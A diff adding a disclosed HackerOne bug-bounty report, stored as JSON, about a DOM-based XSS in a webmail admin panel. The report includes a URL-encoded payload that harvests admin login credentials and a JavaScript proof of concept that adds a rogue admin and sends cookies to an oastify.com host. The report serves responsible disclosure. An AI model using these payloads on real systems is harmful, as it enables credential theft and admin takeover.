@@ -1,0 +1,121 @@
+{
+  "id": 1619445,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjE5NDQ1",
+  "url": "https://hackerone.com/reports/1619445",
+  "title": "Admin account/panel takeOver and Doing actions in admin panel via DOM-based XSS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2022-06-29T17:19:28.642Z",
+  "submitted_at": "2022-06-29T17:19:28.702Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mouhamadlrx",
+    "url": "/mouhamadlrx",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/qe0drn28g8oeabsfi8u540gx3nwb/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2450,
+    "url": "https://hackerone.com/radancy",
+    "handle": "radancy",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Radancy",
+      "twitter_handle": "",
+      "website": "https://radancy.nl",
+      "about": "Radancy NL is a full-service agency specialised in employer branding and recruitment advertising in the Netherlands"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-09-12T06:39:39.681Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-08-13T06:39:39.402Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello team ,\n\nI found Dom-XSS in your (https://████████/) Webmail Admin Panel that manage attacker to stealing admin sensitive info  and doing any action in your  webmail admin panel .\n\n## why and how this vulnerability happen :\n\n    - if your reviewed the source code of this endpoint of the admin panel \" view-source:https://██████████/admin/\" , you can see the vulnerable javascript sink which is document.write :\n\n                ``          \n                      if (█████.my█████.isMy█████Instance()) {\n\t\t                                    \tdocument.write('<script type=\"text/javascript\" src=\"' + ███.my████.getGeneratedDefaultsPath() + '\"><\\/script>');\n\t\t                             }\n                ``\n                     \n  you can see that this sink writing data (that including attacker controllable data  which is the value returned of this function `██████.my████.getGeneratedDefaultsPath() `  ) to the DOM without any sanitization or validation  .\n\n- if your reviewed the difination of  this function `██████.my███.getGeneratedDefaultsPath() ` in this js file \"https://████/admin/my████.js?v=563fd4e62ed50c2ec5695420aa8c280a\"  :\n\n``` █████████.my███████ = {\n    urlParams: function() {\n        var e, a, r, s, n = document.location.search.substr(1), t = n.split(\"&\"), i = {};\n        for (r = 0, s = t.length; s > r; r++) {\n            e = t[r].split(\"=\");\n            a = e[0];\n            i[a] = void 0 === e[1] ? \"\" : decodeURIComponent(e[1]);\n            if (window.JSON && (\"jsonHeaders\" === a || \"uploadHeaders\" === a)) {\n                i[a] = JSON.parse(i[a]);\n            }\n        }\n        return i;\n    }(),\n    isMy█████████Instance: function() {\n        return !!this.urlParams.appUrl;\n    },\n    getGeneratedDefaultsPath: function() {\n        var e = this.urlParams.appUrl;\n        e = e.substr(0, e.indexOf(\"/api/\"));\n        return e + \"/generatedDefaults.js?v=563fd4e62ed50c2ec5695420aa8c280a&X-InstanceId=\" + this.urlParams.jsonHeaders[\"X-InstanceId\"];\n    }\n};\n```\nyou can that the query string parameters is parssed via `urlParams` function and this paramters values then used in `getGeneratedDefaultsPath` function to generate the return value  by taking the value of `appUrl` parameters and passed it with the returned value , and as you can see there is no attacker controllable data sanitization or filtration , which enable attacker to pass malicious code via `appUrl` parameter to  the DOM sink (`document.write`) which manuplate the DOM and excute any code in the admin panel .\n\n\n##POC :\n\n\n1) in case the admin not logged in yet , attacker can  stealing the admin credentials , here steps to reproduce  :\n\n1 - change the value of `attackerServer` variable in the code below to your server .\n2 - just open this link  : \n       https://██████████/admin/?appUrl=x%22%3E%3C/script%3E%3Cscript%3Ealert(document.domain);window.onload%3D()%3D%3E{document.getElementById(%22myframe%22).contentDocument.getElementById(%22login-button%22).onclick%3D()%3D%3E{let%20attackerServer%3D\"https://dizw1b5gzqe6kw4f93zwtiez0q6hu6.oastify.com\";new%20Image().src%3D`${attackerServer}?AdminUsernameIS:${document.getElementById(%22myframe%22).contentDocument.getElementById(%27username%27).value}%26%26AdminPasswordIS:${document.getElementById(%22myframe%22).contentDocument.getElementById(%27password%27).value}`;}}%3C/script%3E%3Ciframe%20id%3D%22myframe%22%20src%3Dhttps://████/admin/login/%20style%3D%22position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20bottom%3A0%3B%20right%3A0%3B%20width%3A100%25%3B%20height%3A100%25%3B%20border%3Anone%3B%20margin%3A0%3B%20padding%3A0%3B%20overflow%3Ahidden%3B%20z-index%3A999999%3B%22%3E//api/&jsonHeaders={%22hf%22:%22uwt%22}\n\nas you can see the xss alert is poped up , and when entering admin credintials and submiting it , this credentials will route to attacker server ( see the attachment video )\n\n2) in case the admin already logged in , attacker can steal the admin auth-token and doing any action in the admin panel , like adding new AdminUser , change admin password ,reading/sending mails ,....etc .\n and here the POC and steps to reproduce stealing admin auth-token and adding new AdminUser :\n\n         1 - first of all as i didn't have admin account in your panel , so  i was installed the ███ software that you are use to show you suitable POC .\n         2- now put this js code in external file in your server : \n                                        ``` \n                                             window.onload = () => {\n\n    let frame1 = document.createElement(\"iframe\");\n    frame1.src = \"http://127.0.0.1:4040/admin/#users\";\n\n\n    let frame2 = document.createElement(\"iframe\");\n    frame2.src = \"http://127.0.0.1:4040/admin/#users\";\n    frame2.setAttribute(\"style\", \"position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;\")\n\n\n    document.body.appendChild(frame1);\n    document.body.appendChild(frame2);\n\n\n    function addNewAdmin() {\n\n\n        setTimeout(() => {\n            k_webAssist.k_showIframe = () => {\n                let prevertEROR = \"no worries\"\n            }\n            frame1.contentDocument.getElementById('users_k_bottomToolbar_k_btnAdd').click();\n        }, 3000)\n\n\n\n        setTimeout(() => {\n\n            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_loginName').value = 'NewUserNameFromAttacker';\n            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_password').value = 'Admin123123';\n            frame1.contentDocument.getElementById('userEditorAdd_k_formGeneral_passwordConfirmation').value = 'Admin123123';\n\n            frame1.contentDocument.getElementById('userEditorAdd_k_tb_k_btnOk').click();\n        }, 5000)\n\n        return true;\n\n    }\n\n    function sendAuthTokenToAttacker() {\n        let attackerServer = 'https://kh5zh0fcso7usao2eu9fhu74wv2rqg.oastify.com';\n        let script=document.createElement('script');\n        script.src=attackerServer +\"?here the Auth-token:\"+JSON.stringify(document.cookie);\n        document.body.appendChild(script);\n    }\n\n\n    frame1.onload = () => {\n        if(addNewAdmin()==true)\n        sendAuthTokenToAttacker();\n    }\n\n}\n              \n```\n\n##Note: please don't forget to change `attackerServer ` to your which you want to route the `Auth-token` to it.\n\n3- now just edit the below link with `yourServer` and open it : \nhttp://127.0.0.1:4040/admin/?appUrl=%22%3E%3C/script%3E%3Cscript%20src%3Dhttps://yourServer.com/myScript.js%3E%3C/script%3E//api/&jsonHeaders={%22hf%22:%22uwt%22}\n4- wait a little then the `auth-token` will route to attackerServer , and new AdminUser will added without any admin interaction!\n\n##End:\n-I hope the vulnerability and Impact/exploit it's clear to you now because I spent a lot of time to build this report as clear as :)\n\n- Best regards!\n\n## Impact\n\n- by executing JavaScript code in the admin browser , attacker can do any action in the admin panel without admin interaction and even takeOver the admin account/panel .",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-09-12T06:39:39.501Z",
+  "allow_singular_disclosure_after": -13333676.018816259,
+  "singular_disclosure_allowed": true,
+  "vote_count": 61,
+  "voters": [
+    "mr-medi",
+    "shreyaschavhan",
+    "p4n7h3rx",
+    "seudxs",
+    "7odamoo",
+    "zy9ard3",
+    "shubham_srt",
+    "cmdumb",
+    "dilawer",
+    "kmxx",
+    "and 51 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 162,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.maximum.nl",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
